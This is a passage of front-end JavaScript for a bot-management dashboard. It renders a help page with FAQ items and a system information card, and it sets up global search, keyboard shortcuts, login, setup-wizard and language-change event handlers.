            <summary><strong>${esc(_t('helpPage.faq2Title'))}</strong></summary>
            <p>${_t('helpPage.faq2Body')}</p>
          </details>
          <details class="faq-item">
            <summary><strong>${esc(_t('helpPage.faq3Title'))}</strong></summary>
            <p>${_t('helpPage.faq3Body')}</p>
          </details>
          <details class="faq-item">
            <summary><strong>${esc(_t('helpPage.faq4Title'))}</strong></summary>
            <p>${_t('helpPage.faq4Body')}</p>
          </details>
          <details class="faq-item">
            <summary><strong>${esc(_t('helpPage.faq5Title'))}</strong></summary>
            <p>${_t('helpPage.faq5Body')}</p>
          </details>
        </div>
      </div>

      <!-- Infos système -->
      <div class="card">
        <div class="card-header"><span class="card-title"><i class="ti ti-server"></i>${esc(_t('helpPage.systemInfo'))}</span></div>
        <div class="card-body">
          <div class="metric-row"><span class="metric-key">${esc(_t('settingsPage.nexusVersion'))}</span><span class="metric-val" id="about-version-help">—</span></div>
          <div class="metric-row"><span class="metric-key">${esc(_t('dashboardPage.nodejs'))}</span><span class="metric-val">${esc(sys?.versions?.node || '—')}</span></div>
          <div class="metric-row"><span class="metric-key">${esc(_t('dashboardPage.pm2Ver'))}</span><span class="metric-val">${esc(sys?.versions?.pm2 || '—')}</span></div>
          <div class="metric-row"><span class="metric-key">${esc(_t('dashboardPage.os'))}</span><span class="metric-val">${esc(sys?.os?.distro || '—')} ${esc(sys?.os?.release || '')}</span></div>
          <div class="metric-row"><span class="metric-key">${esc(_t('dashboardPage.hostname'))}</span><span class="metric-val">${esc(sys?.os?.hostname || '—')}</span></div>
          <div class="metric-row"><span class="metric-key">${esc(_t('helpPage.storage'))}</span><span class="metric-val">${esc((sys?.disk?.mount || '/opt') + ' · ' + (sys?.disk?.used || 0) + ' / ' + (sys?.disk?.total || 0) + ' Go')}</span></div>
        </div>
      </div>
    `;
    // Refresh the version chip in the system info card
    refreshVersionBadge();
  } catch (e) {
    page.innerHTML = `<div class="loader" style="color:var(--red);">${esc(e.message)}</div>`;
  }
}

// ------------------------------------------------------------
// GLOBAL SEARCH
// ------------------------------------------------------------
function globalSearch(q) {
  if (!q?.trim()) return;
  const match = App.bots.find(b => b.name.toLowerCase().includes(q.toLowerCase()));
  if (match) navigate('bot', { botName: match.name });
}

// ------------------------------------------------------------
// INIT
// ------------------------------------------------------------
document.addEventListener('DOMContentLoaded', () => {
  // Keyboard shortcuts
  document.addEventListener('keydown', e => {
    if ((e.ctrlKey || e.metaKey) && e.key === 'k') { e.preventDefault(); document.getElementById('global-search')?.focus(); }
    if (e.key === 'Escape') { document.querySelector('.modal-overlay')?.remove(); document.querySelector('.ctx-menu')?.remove(); }
  });

  // Login form
  document.getElementById('login-btn')?.addEventListener('click', doLogin);
  document.getElementById('login-pass')?.addEventListener('keydown', e => { if (e.key === 'Enter') doLogin(); });
  document.getElementById('login-user')?.addEventListener('keydown', e => { if (e.key === 'Enter') doLogin(); });

  // Setup wizard
  document.getElementById('setup-next')?.addEventListener('click', setupNext);
  document.getElementById('setup-prev')?.addEventListener('click', setupPrev);

  // Sidebar items
  document.querySelectorAll('.sb-item[data-page]').forEach(el => {
    el.addEventListener('click', () => navigate(el.dataset.page));
  });

  // React to global language changes (covers any i18n.setLang call site)
  document.addEventListener('nexus:langchange', (ev) => {
    // Only trigger full rerender if the app is logged in (currentPage set).
    if (App.currentPage) applyLanguage(ev.detail?.lang);
  });

  // Initial static-DOM pass: translate sidebar + sections that are
  // present at boot, regardless of the active page.
  if (window.NexusI18n) NexusI18n.apply();

  // Boot
  bootApp();
});
